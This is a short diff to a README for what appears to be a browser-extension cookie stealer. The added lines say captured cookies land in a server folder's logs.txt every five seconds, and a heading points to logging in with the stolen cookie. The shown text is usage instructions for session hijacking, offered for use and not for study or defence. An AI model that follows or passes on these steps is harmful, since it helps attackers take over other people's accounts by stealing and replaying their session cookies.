@@ -22,7 +22,9 @@ https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe
 
 load the extension in chrome or firefox
 
-your will find the cookies in the file logs.txt
+your will find the cookies in the folder server , file ( logs.txt )
+
+every 5 secondes you get the cookie
 
 
 ## login with the cookie
